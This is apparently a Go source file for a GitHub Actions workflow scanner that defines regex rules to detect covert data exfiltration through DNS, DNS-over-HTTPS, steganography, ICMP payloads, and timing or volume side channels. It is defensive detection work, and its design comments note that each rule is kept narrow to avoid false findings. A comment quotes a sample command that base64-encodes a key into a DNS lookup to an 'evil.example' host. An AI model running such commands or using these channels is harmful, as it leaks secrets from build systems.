/*
Copyright 2025 Hare Krishna Rai

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package rules

import (
	"regexp"

	"github.com/harekrishnarai/flowlyt/v2/pkg/parser"
)

// Advanced exfiltration detection.
//
// These techniques deliberately complement, rather than duplicate,
// MALICIOUS_DATA_EXFILTRATION. That rule already covers the common cases:
// named tunneling services, known paste/webhook endpoints, direct IP targets,
// and secrets piped into curl. The techniques here cover channels it cannot
// see, where the data leaves over a protocol or medium that is not obviously a
// network upload.
//
// Each technique is deliberately narrow. A broad pattern in this space produces
// findings on ordinary build scripts, and an exfiltration rule that cries wolf
// is worse than no rule at all.

var (
	// A DNS lookup whose hostname is built by command substitution. Data is
	// smuggled out in the query name itself, so nothing is ever "uploaded".
	// MALICIOUS_DATA_EXFILTRATION only matches simple `$VAR` interpolation
	// here, so `nslookup "$(cat key | base64).evil.example"` slips past it.
	dnsLookupWithSubstitution = regexp.MustCompile(`(?i)\b(nslookup|dig|host|drill)\b[^|;]*\$\(`)

	// A workflow expression or command substitution used as a subdomain label,
	// which is the canonical DNS exfiltration shape.
	dnsSubdomainExfil = regexp.MustCompile(`(?i)(\$\{\{[^}]+\}\}|\$\([^)]*\))\.[a-z0-9][a-z0-9-]*\.[a-z]{2,}`)

	// DNS-over-HTTPS resolvers used to carry an expression, which evades
	// egress filtering that only watches port 53.
	dnsOverHTTPSExfil = regexp.MustCompile(`(?i)curl[^|;]*(dns\.google|cloudflare-dns\.com|dns\.quad9\.net|\b1\.1\.1\.1\b)[^|;]*\$\{\{`)
)

var (
	// Tools whose entire purpose is hiding one file inside another.
	steganographyEmbed = regexp.MustCompile(`(?i)\b(steghide\s+embed|outguess\s+-d|stegosuite|zsteg\s+-|cloakify)\b`)

	// Metadata fields large enough to carry a secret, written with a value
	// derived from an expression or a secret.
	steganographyMetadata = regexp.MustCompile(`(?i)exiftool[^|;]*-(comment|usercomment|description|xmp:[a-z]+)\s*=[^|;]*(\$\{\{|\$\()`)
)

var (
	// ICMP with an explicit hex payload. Legitimate CI never needs this.
	icmpPayloadChannel = regexp.MustCompile(`(?i)\bping\b[^|;]*\s-p\s+[0-9a-f]{4,}`)

	// Sleep duration derived from untrusted input: a timing side channel that
	// leaks data through job duration.
	timingChannel = regexp.MustCompile(`(?i)\bsleep\s+\$\(\([^)]*\$\{\{`)

	// Transfer size derived from untrusted input, leaking data through the
	// volume written rather than its content.
	volumeChannel = regexp.MustCompile(`(?i)\bdd\b[^|;]*\bcount=\$?\{?\{?[^\s]*\$\{\{`)
)

// exfiltrationTechniques enumerates the covert exfiltration channels detected.
//
// To cover a new technique, add an entry here: the shared scanner supplies line
// pinpointing, comment handling, and deduplication.
func exfiltrationTechniques() []shellTechnique {
	return []shellTechnique{
		{
			ID:          "DNS_EXFILTRATION",
			Name:        "Data Exfiltration via DNS",
			Severity:    High,
			Category:    MaliciousPattern,
			Description: "Command encodes data into a DNS query, exfiltrating it over a channel that egress filtering and network monitoring rarely inspect",
			Remediation: "Remove the lookup. If the workflow genuinely needs dynamic DNS resolution, build the hostname from a fixed allowlist rather than from command output or workflow expressions.",
			MatchLine:   anyPattern(dnsLookupWithSubstitution, dnsSubdomainExfil, dnsOverHTTPSExfil),
		},
		{
			ID:          "STEGANOGRAPHIC_EXFILTRATION",
			Name:        "Data Exfiltration via Steganography",
			Severity:    Medium,
			Category:    MaliciousPattern,
			Description: "Command hides data inside another file or its metadata, so the payload survives artifact upload and review without appearing to be sensitive",
			Remediation: "Remove the embedding step. Data that must leave the runner should travel over an audited channel where its contents are visible to reviewers.",
			MatchLine:   anyPattern(steganographyEmbed, steganographyMetadata),
		},
		{
			ID:          "COVERT_CHANNEL_EXFILTRATION",
			Name:        "Data Exfiltration via Covert Channel",
			Severity:    Medium,
			Category:    MaliciousPattern,
			Description: "Command leaks data through a side channel such as ICMP payloads, job timing, or transfer volume, rather than through an observable upload",
			Remediation: "Remove the command. Encoding data into packet payloads, sleep durations, or transfer sizes has no legitimate purpose in CI.",
			MatchLine:   anyPattern(icmpPayloadChannel, timingChannel, volumeChannel),
		},
	}
}

// CheckAdvancedExfiltration detects covert data exfiltration channels in
// `run:` steps.
func CheckAdvancedExfiltration(workflow parser.WorkflowFile) []Finding {
	return scanShellTechniques(workflow, exfiltrationTechniques())
}

// Each technique is also exposed as an individually registrable rule so users
// can enable or disable it by ID. Selection is by ID rather than by slice
// position, so reordering the table cannot silently repoint a rule.
func checkDNSExfiltration(workflow parser.WorkflowFile) []Finding {
	return scanShellTechniques(workflow, selectTechniques(exfiltrationTechniques(), "DNS_EXFILTRATION"))
}

func checkSteganographicExfiltration(workflow parser.WorkflowFile) []Finding {
	return scanShellTechniques(workflow, selectTechniques(exfiltrationTechniques(), "STEGANOGRAPHIC_EXFILTRATION"))
}

func checkCovertChannelExfiltration(workflow parser.WorkflowFile) []Finding {
	return scanShellTechniques(workflow, selectTechniques(exfiltrationTechniques(), "COVERT_CHANNEL_EXFILTRATION"))
}
